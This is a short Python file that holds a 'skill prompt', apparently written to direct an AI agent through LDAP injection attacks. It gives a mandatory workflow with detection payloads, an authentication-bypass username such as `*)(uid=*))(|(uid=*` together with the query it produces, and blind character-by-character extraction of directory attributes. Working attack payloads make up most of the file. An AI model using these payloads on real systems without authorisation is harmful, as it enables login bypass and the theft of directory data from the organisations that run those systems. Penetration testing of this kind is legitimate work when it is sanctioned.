"""
LDAP Injection Attack Skill Prompt.
"""

LDAP_INJECTION_SKILL_PROMPT = """
## ATTACK SKILL: LDAP INJECTION

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Test authentication forms and search fields that might query LDAP/Active Directory:
- `*` → returns all results if injectable
- `*)(uid=*))(|(uid=*` → always-true bypass
- `admin*` → partial match test
- `admin)(|(password=*` → AND/OR injection

#### STEP 2: AUTH BYPASS
```
username: *)(uid=*))(|(uid=*
password: anything
→ Query becomes: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
→ Always evaluates to TRUE
```

#### STEP 3: BLIND LDAP EXTRACTION
```
username: *)(department=Marketing
→ Different response if department exists
username: *)(department=A*
→ Character-by-character enumeration
```

#### ANTI-PATTERNS: LDAP injection is often confused with SQLi — check if the app uses Active Directory/LDAP for auth.
"""
